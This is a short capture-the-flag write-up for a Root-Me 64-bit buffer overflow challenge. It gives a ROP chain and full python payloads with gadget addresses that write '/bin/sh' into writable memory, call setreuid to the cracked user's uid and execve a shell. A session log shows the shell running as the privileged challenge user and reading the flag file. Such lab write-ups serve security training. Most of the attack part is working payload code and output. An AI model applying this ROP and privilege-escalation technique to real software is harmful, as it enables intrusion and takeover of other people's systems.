# Advanced buffer overflow

## Writeup

Let's rop chain like this:
```
[junk]["/bin/sh"][pop rax][0x3b][pop rsi]["/bin/sh" address][pop rdi][0x00...][pop rsi][x000][syscall]
```

```
./ch34 < <(python -c 'print "A"*256+"BBBBBBBB"+"CCCCCCCC"+"/bin/sh\x00"+"\xa7\xb6\x46\x00\x00\x00\x00\x00"+"\x3b\x00\x00\x00\x00\x00\x00\x00"+"\x03\x7a\x43\x00\x00\x00\x00\x00"+"\x20\xe1\xff\xff\xff\x7f\x00\x00"+"\x02\x68\x47\x00\x00\x00\x00\x00"+"\x00\x00\x00\x00\x00\x00\x00\x00"+"\x05\x72\x43\x00\x00\x00\x00\x00"+"\x00\x00\x00\x00\x00\x00\x00\x00"+"\xb5\xeb\x45\x00\x00\x00\x00\x00"')
```

***<- works in gdb. Indeed it is spawning a shell)***

But fuck. The rootme challenge uses ASLR so we can't determine an address of the string. Let's put this string somewhere else with write permission.
We'll use ```0x6c0000```.

```
pop rax <- "/bin/sh\x00"
pop rsi <- 0x6c0000
mov [rsi], rax
pop rax <- 0x71 (syscall sys_setreuid)
pop rdi <- 1234 (app-systeme-ch34-cracked uid)
pop rsi <- 1234 (app-systeme-ch34-cracked uid)
syscall
pop rax <- 0x3b (syscall execve)
pop rdi <- 0x6c0000
pop rsi <- 0
pop rdx <- 0
syscall
```

```
app-systeme-ch34@challenge03:~$ ./ch34 < <(python -c 'print "A"*256+"BBBBBBBB"+"CCCCCCCC"+"/bin/sh\x00"+"\xa7\xb6\x46\x00\x00\x00\x00\x00" +"\x2f\x62\x69\x6e\x2f\x73\x68\x00"+"\x02\x68\x47\x00\x00\x00\x00\x00" + "\x00\x00\x6c\x00\x00\x00\x00\x00" + "\x51\x7b\x46\x00\x00\x00\x00\x00"+"\x03\x7a\x43\x00\x00\x00\x00\x00"+"\xd2\x04\x00\x00\x00\x00\x00\x00"+"\x02\x68\x47\x00\x00\x00\x00\x00"+"\xd2\x04\x00\x00\x00\x00\x00\x00"+"\xa7\xb6\x46\x00\x00\x00\x00\x00"+"\x71\x00\x00\x00\x00\x00\x00\x00"+"\xb5\xeb\x45\x00\x00\x00\x00\x00"+"\x03\x7a\x43\x00\x00\x00\x00\x00"+"\x00\x00\x6c\x00\x00\x00\x00\x00"+"\xa7\xb6\x46\x00\x00\x00\x00\x00"+"\x3b\x00\x00\x00\x00\x00\x00\x00"+"\x03\x7a\x43\x00\x00\x00\x00\x00"+"\x00\x00\x6c\x00\x00\x00\x00\x00"+"\x02\x68\x47\x00\x00\x00\x00\x00"+"\x00\x00\x00\x00\x00\x00\x00\x00"+"\x05\x72\x43\x00\x00\x00\x00\x00"+"\x00\x00\x00\x00\x00\x00\x00\x00"+"\xb5\xeb\x45\x00\x00\x00\x00\x00"' && cat -)
Hex result: 414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414242424242424242170100000c0100002f62696e2f7368
ls
ch34  ch34.c
whoami
app-systeme-ch34-cracked
cat .passwd
```

*Finally!*

## Resources

[How to rop en 64 bits - french shit](https://unix4fun.github.io/post/howto-rop-en-64bits/)
[RopGadget](https://github.com/JonathanSalwan/ROPgadget)